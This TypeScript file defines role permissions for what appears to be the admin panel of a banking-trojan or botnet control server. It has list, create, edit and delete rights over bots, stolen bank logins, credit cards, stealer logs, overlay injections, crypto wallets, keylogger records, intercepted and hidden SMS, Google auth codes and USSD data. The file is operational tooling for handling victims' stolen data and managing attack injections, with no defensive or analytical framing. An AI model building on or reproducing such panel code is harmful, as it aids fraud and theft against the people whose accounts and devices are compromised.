// TODO refactor to Utils and change format on ts

export const permissionGroups = {
    "bots": [
        "bots.list",
        "bots.delete",
        "bots.comment",
    ],
    "users": [
        "users.list",
        "users.create",
        "users.edit",
        "users.delete",
        "users.token",
    ],
    "banks": [
        "banks.list",
        "banks.delete",
    ],
    "credit_cards": [
        "credit_cards.list",
        "credit_cards.delete",
    ],
    "stealers": [
        "stealers.list",
        "stealers.delete",
    ],
    "injections": [
        "injections.list",
        "injections.create",
        "injections.edit",
        "injections.delete",
    ],
    "crypt": [
        "crypt.list",
        "crypt.delete",
    ],
    "shops": [
        "shops.list",
        "shops.delete",
    ],
    "emails": [
        "emails.list",
        "emails.delete",
    ],
    "wallets": [
        "wallets.list",
        "wallets.delete",
    ],
    "permissions": [
        "permissions.list",
        "permissions.change",
    ],
    "stats": [
        "stats.list",
    ],
    "sms": [
        "sms.list",
    ],
    "events": [
        "events.list",
    ],
    "googleauth": [
        "googleauth.list",
    ],
    "hidesms": [
        "hidesms.list",
    ],
    "keylogger": [
        "keylogger.list",
    ],
    "mail": [
        "mail.list",
    ],
    "otheraccounts": [
        "otheraccounts.list",
    ],
    "phonenumber": [
        "phonenumber.list",
    ],
    "pushlist": [
        "pushlist.list",
    ],
    "ussd": [
        "ussd.list",
    ],
};

export const permissionNames: Record<string, string> = {
    "bots.list": "View bots list",
    "bots.delete": "Delete bots",
    "bots.comment": "Comment bots",
    "users.list": "View users list",
    "users.create": "Create users",
    "users.edit": "Edit users",
    "users.delete": "Delete users",
    "users.token": "View users token",
    "banks.list": "View banks list",
    "banks.delete": "Delete banks",
    "credit_cards.list": "View cards list",
    "credit_cards.delete": "Delete cards",
    "stealers.list": "View stealers list",
    "stealers.delete": "Delete stealers",
    "injections.list": "View injections list",
    "injections.create": "Create injections",
    "injections.edit": "Edit injections",
    "injections.delete": "Delete injections",
    "crypt.list": "View crypt list",
    "crypt.delete": "Delete crypt",
    "shops.list": "View shops list",
    "shops.delete": "Delete shops",
    "emails.list": "View emails list",
    "emails.delete": "Delete emails",
    "wallets.list": "View wallets list",
    "wallets.delete": "Delete wallets",
    "permissions.list": "View permissions list",
    "permissions.change": "Change permissions",
    "stats.list": "View stats list",
    "events.list": "View events list",
    "googleauth.list": "View Google auth list",
    "hidesms.list": "View HideSMS list",
    "keylogger.list": "View keylogger list",
    "mail.list": "View mail list",
    "otheraccounts.list": "View other accounts list",
    "phonenumber.list": "View phone numbers list",
    "pushlist.list": "View push list",
    "ussd.list": "View USSD list",
};

export interface PermissionsDataSource {
    key: number,
    permission: string,
    roles: string[],
}
